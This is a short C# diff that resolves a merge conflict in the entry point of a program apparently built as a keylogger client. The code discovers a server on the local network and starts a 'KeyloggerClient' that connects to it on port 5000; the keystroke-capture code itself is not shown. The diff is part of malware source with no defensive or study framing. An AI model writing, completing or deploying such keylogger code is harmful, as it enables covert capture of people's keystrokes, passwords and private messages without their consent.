@@ -11,22 +11,21 @@ class Program
     /// <returns>A Task representing the asynchronous operation.</returns>
     static async Task Main()
     {
-<<<<<<< HEAD
-        var client = new KeyloggerClient.KeyloggerClient();
-        await client.StartAsync();
-=======
+        // Attempt to discover the server IP on the local network
         string serverIp = await ServerDiscovery.DiscoverServerAsync();
 
         if (serverIp != null)
         {
             Console.WriteLine("Discovered server at: " + serverIp);
-            await keyloggerClient.StartAsync(serverIp, 5000);
+
+            var keyloggerClient = new KeyloggerClient.KeyloggerClient();
+
+            // Start the keylogger client and connect to discovered server
+            await keyloggerClient.StartAsync(host: serverIp, port: 5000);
         }
         else
         {
             Console.WriteLine("Server not found on local network.");
         }
-
->>>>>>> 2328a60 (changes)
     }
 }
